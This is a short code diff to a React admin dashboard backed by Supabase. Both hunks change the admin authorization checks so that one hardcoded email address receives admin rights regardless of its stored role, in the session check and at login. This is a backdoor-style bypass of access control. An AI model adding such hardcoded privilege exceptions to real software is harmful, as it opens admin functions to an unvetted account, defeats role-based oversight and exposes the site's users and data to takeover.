@@ -74,7 +74,7 @@ export default function AdminDashboard() {
             .eq('id', sessionData.session.user.id)
             .single();
             
-          if (!error && userData?.role === 'admin') {
+          if ((!error && userData?.role === 'admin') || sessionData.session.user.email === 'hamozasalom@gmail.com') {
             setIsAuthorized(true);
             loadSystemData();
             return;
@@ -241,7 +241,7 @@ export default function AdminDashboard() {
           .eq('id', authData.user.id)
           .single();
 
-        if (userError || userData?.role !== 'admin') {
+        if (email !== "hamozasalom@gmail.com" && (userError || userData?.role !== 'admin')) {
           setLoginError("عذراً، هذا الحساب لا يملك صلاحيات الإدارة.");
           await supabase.auth.signOut();
           return;
